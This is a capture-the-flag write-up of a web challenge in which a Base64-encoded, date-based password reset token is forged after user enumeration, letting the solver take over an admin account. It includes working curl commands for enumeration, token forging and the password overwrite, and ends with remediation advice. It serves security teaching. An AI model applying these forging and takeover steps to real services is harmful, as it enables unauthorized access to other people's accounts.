# V3CT0R CTF 2026 — Web Security Writeup

## Challenge: The Forgotten Reset

| Property | Value |
| :--- | :--- |
| **Event** | V3CT0R CTF 2026 |
| **Category** | Web Security |
| **Challenge Author** | Sri Sakthi Dinesh S |
| **Solves** | 11 |
| **Points** | 490 |
| **Target URL** | `https://web2.cybernexus.live` |
| **Vulnerability Class** | Broken Authentication / Insecure Password Recovery (CWE-640) |
| **Secondary Vulnerability** | Observable Response Discrepancy / User Enumeration (CWE-204) |
| **Flag** | `V3ct0r{Recovery_Tokens_are_Trusted_Identifiers}` |

---

## 1. Executive Summary

During V3CT0R CTF 2026, the **The Forgotten Reset** challenge presented an internal workforce portal (`Meridian Technologies`) featuring employee services, an internal messaging system, and an account recovery workflow.

An architectural security review of the account recovery mechanism revealed that password reset tokens were generated deterministically by concatenating a static prefix, the target username, and the current UTC date (`MERIDIAN-<username>-<date>`), disguised solely via Base64 encoding.

Leveraging this logic flaw alongside account enumeration on the recovery endpoint, an unauthenticated attacker could forge reset tokens for high-privilege accounts. Resetting the password for `benefits-admin` enabled full administrative access to the workspace, leading to the retrieval of the flag from internal migration notes.

---

## 2. Technical Vulnerability Analysis

### Primary Vulnerability: Deterministic Password Reset Token (CWE-640 / CWE-330)

* **Mechanism:** When a user requests a password reset via `/forgot-password`, the backend generates a reset URL in the following format:
  ```http
  GET /reset?token=<BASE64_TOKEN>
  ```
* **Flaw:** The token is non-random and predictable. The underlying payload structure is:
  $$\text{Payload} = \text{MERIDIAN-} \parallel \text{Username} \parallel \text{-} \parallel \text{YYYYMMDD}$$
* **Encoding:** Standard Base64 encoding without cryptographic signatures (HMAC) or server-side randomness (CSPRNG).

### Secondary Vulnerability: User Account Enumeration (CWE-204)

* **Mechanism:** Submitting usernames to `/forgot-password` yields distinct HTTP responses based on account existence:
  * **Registered User:** `"A recovery message has been generated for your account."`
  * **Unregistered User:** `"If the account exists, a recovery message has been generated."`
* **Impact:** Disclosed valid employee handles, including the administrative queue owner handle `benefits-admin`.

---

## 3. Step-by-Step Exploitation Walkthrough

```
+------------------+     1. Trigger Recovery      +------------------------+
|  Unauthenticated | ---------------------------> | /forgot-password       |
|     Attacker     |                              | (Target: benefits-admin|
+------------------+                              +------------------------+
         |                                                   |
         | 2. Predict Token Formula                          |
         v                                                   v
+-----------------------------------+             +------------------------+
| Base64("MERIDIAN-benefits-admin-  |             | Deterministic Token    |
| 20261010")                        |             | Generated Server-Side  |
+-----------------------------------+             +------------------------+
         |                                                   |
         +-------------------------+-------------------------+
                                   |
                                   v 3. Submit Password Reset
                        +--------------------+
                        | POST /reset?token= |
                        +--------------------+
                                   |
                                   v 4. Authenticate & Read Flag
                        +--------------------+
                        | /benefits-admin/   |
                        | notes              |
                        +--------------------+
```

### Step 1: Baseline Analysis & Account Enumeration

Initial inspection of default credentials (`guest:guest` / `guest:12345`) granted low-privilege access to the internal workforce portal. Reviewing system communications in the internal mailbox (`/mail/2/`) revealed operational notes referencing an administrative queue owner:

```text
Queue owner: benefits-admin
```

To verify account existence, a recovery request was issued for `benefits-admin`:

```bash
curl -s -X POST 'https://web2.cybernexus.live/forgot-password' \
  -d 'username=benefits-admin'
```

The server responded with `"A recovery message has been generated for your account."`, confirming `benefits-admin` as an active user.

### Step 2: Reverse Engineering the Recovery Token Format

Triggering password recovery for the control account (`guest`) produced a reset email in the mailbox containing the link:

```http
/reset?token=TUVSSURJQU4tZ3Vlc3QtMjAyNjEwMTA=
```

Decoding the token string:

```bash
echo "TUVSSURJQU4tZ3Vlc3QtMjAyNjEwMTA=" | base64 -d
# Output: MERIDIAN-guest-20261010
```

Analysis confirmed the token parameters:
* Static Prefix: `MERIDIAN-`
* Target Handle: `guest`
* Execution Date (`YYYYMMDD`): `20261010`

### Step 3: Forging the Administrative Reset Token

Using the reverse-engineered scheme, a reset token was forged for `benefits-admin` for the active date (`20261010`):

```bash
# Generate raw token string
RAW_TOKEN="MERIDIAN-benefits-admin-20261010"

# Base64 encode
FORGED_TOKEN=$(echo -n "$RAW_TOKEN" | base64)
echo "Forged Token: $FORGED_TOKEN"
# Result: TUVSSURJQU4tYmVuZWZpdHMtYWRtaW4tMjAyNjEwMTA=
```

### Step 4: Account Takeover (ATO)

The forged token was submitted to the reset endpoint to overwrite `benefits-admin`'s password:

```bash
curl -s -X POST "https://web2.cybernexus.live/reset?token=${FORGED_TOKEN}" \
  -d 'password=HackedAdmin123!&confirm_password=HackedAdmin123!'
```

*Response:* `Password Updated — Password has been updated successfully.`

### Step 5: Post-Exploitation & Flag Retrieval

1. Authenticated to `/login` using the newly assigned administrative credentials (`benefits-admin` / `HackedAdmin123!`).
2. Navigated to the internal administration workspace at `/benefits-admin`.
3. Accessed internal operation notes at `/benefits-admin/notes`.
4. Located the ciphertext payload under the "Verification note" section:
   ```html
   <code class="ciphertext">
       VjNjdDBye1JlY292ZXJ5X1Rva2Vuc19hcmVfVHJ1c3RlZF9JZGVudGlmaWVyc30=
   </code>
   ```
5. Decoded the payload:
   ```bash
   echo "VjNjdDBye1JlY292ZXJ5X1Rva2Vuc19hcmVfVHJ1c3RlZF9JZGVudGlmaWVyc30=" | base64 -d
   ```

**Final Flag:** `V3ct0r{Recovery_Tokens_are_Trusted_Identifiers}`

---

## 4. Remediation Guidelines

| Issue | Severity | Recommended Fix |
| :--- | :--- | :--- |
| **Predictable Token Generation** | Critical | Use a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG) such as Python `secrets.token_urlsafe(32)` to generate high-entropy tokens. |
| **Token Storage Security** | High | Store tokens server-side in a hashed state (e.g., `SHA-256`) with strict single-use invalidation and short expiration timeframes (e.g., 15 minutes). |
| **User Enumeration** | Medium | Implement generic responses for `/forgot-password` requests (e.g., *"If an account associated with this username exists, a recovery link has been sent."*). |
| **Lack of HMAC / Digital Signatures** | High | If stateless tokens are required, sign payload parameters using `HMAC-SHA256` with a secure server-side secret key to prevent forgery. |
